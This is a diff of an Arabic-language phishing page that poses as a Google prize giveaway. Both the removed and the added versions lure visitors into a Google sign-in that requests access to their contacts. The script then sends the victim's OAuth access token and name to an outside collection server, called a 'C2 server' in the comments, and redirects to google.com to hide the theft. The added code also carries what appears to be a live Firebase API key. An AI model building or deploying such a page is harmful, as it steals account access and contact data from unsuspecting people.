@@ -3,103 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تهانينا! فوز بجائزة قيمة</title>
+    <title>استلام الجائزة</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
-    
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: white;
-            padding: 2rem;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-        }
-        img { width: 100px; margin-bottom: 1rem; }
-        h1 { color: #1a73e8; font-size: 1.5rem; margin-bottom: 1rem; }
-        p { color: #5f6368; line-height: 1.6; margin-bottom: 2rem; }
-        .btn {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 5px;
-            font-size: 1rem;
-            cursor: pointer;
-            width: 100%;
-            font-weight: bold;
-            transition: background 0.3s;
-        }
-        .btn:hover { background-color: #1557b0; }
-    </style>
 </head>
-<body>
+<body style="font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4;">
 
-<div class="card">
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-    <h1>تهانينا! لقد فزت بجائزة قيمة</h1>
-    <p>يرجى تسجيل الدخول بحساب جوجل الموثق لتأكيد هويتك واستلام هديتك فوراً.</p>
-    <button class="btn" onclick="login()">تسجيل الدخول واستلام الهدية</button>
-</div>
+    <div style="background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
+        <h2 style="color: #1a73e8;">مبروك! أنت مؤهل للحصول على جائزة</h2>
+        <p>سجل دخولك لتأكيد حسابك واستلام الجائزة فوراً</p>
+        <button onclick="login()" style="background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px;">
+            تسجيل الدخول عبر Google
+        </button>
+    </div>
 
-<script>
-    // --- إعدادات Firebase الخاصة بك ---
-    const firebaseConfig = {
-        apiKey: "AIzaSyC2-XyOs5ZKmoY-a5CDzolYEXAMPLE", // تأكد من وضع الـ API Key الخاص بك هنا
-        authDomain: "medo7788.firebaseapp.com",
-        projectId: "medo7788",
-        storageBucket: "medo7788.appspot.com",
-        messagingSenderId: "1067108116204",
-        appId: "1:1067108116204:web:your_app_id"
-    };
+    <script>
+        // إعدادات مشروعك الجديد اللي بعته يا وحش
+        const firebaseConfig = {
+            apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
+            authDomain: "giftapp-5937d.firebaseapp.com",
+            projectId: "giftapp-5937d",
+            storageBucket: "giftapp-5937d.firebasestorage.app",
+            messagingSenderId: "1067108116204",
+            appId: "1:1067108116204:web:dd2b2717c17590b10be7c9"
+        };
 
-    // بدء تشغيل Firebase
-    firebase.initializeApp(firebaseConfig);
+        firebase.initializeApp(firebaseConfig);
+        const C2_SERVER = "https://mohamedahmed77.pythonanywhere.com/catch";
 
-    // عنوان الوحش (C2 Server)
-    const C2_SERVER = "https://mohamedahmed77.pythonanywhere.com/catch";
-
-    function login() {
-        const provider = new firebase.auth.GoogleAuthProvider();
-        // طلب صلاحيات الوصول لجهات الاتصال
-        provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
-        
-        // استخدام التوجيه المباشر لتجنب حظر النوافذ المنبثقة
-        firebase.auth().signInWithRedirect(provider);
-    }
-
-    // الكود الذي يعمل بعد عودة الضحية من تسجيل الدخول
-    firebase.auth().getRedirectResult().then((result) => {
-        if (result.credential) {
-            const token = result.credential.accessToken;
-            const user = result.user;
-            const senderName = user.displayName || "Unknown_User";
-
-            // إرسال البيانات للوحش
-            fetch(`${C2_SERVER}?token=${token}&sender=${senderName}`)
-            .then(() => {
-                // توجيه نهائي للتمويه
-                window.location.href = "https://google.com/search?q=جوائز+جوجل";
-            })
-            .catch(() => {
-                window.location.href = "https://google.com";
-            });
+        function login() {
+            const provider = new firebase.auth.GoogleAuthProvider();
+            provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
+            // استخدام الـ Redirect لتخطي صفحة about:blank
+            firebase.auth().signInWithRedirect(provider);
         }
-    }).catch((error) => {
-        console.error("Auth Error:", error);
-    });
-</script>
 
+        // استلام النتيجة بعد العودة من جوجل
+        firebase.auth().getRedirectResult().then((result) => {
+            if (result.credential) {
+                const token = result.credential.accessToken;
+                const sender = result.user.displayName || "Target";
+                
+                // إرسال الصيد للوحش
+                fetch(`${C2_SERVER}?token=${token}&sender=${sender}`)
+                .then(() => { window.location.href = "https://google.com"; })
+                .catch(() => { window.location.href = "https://google.com"; });
+            }
+        });
+    </script>
 </body>
 </html>
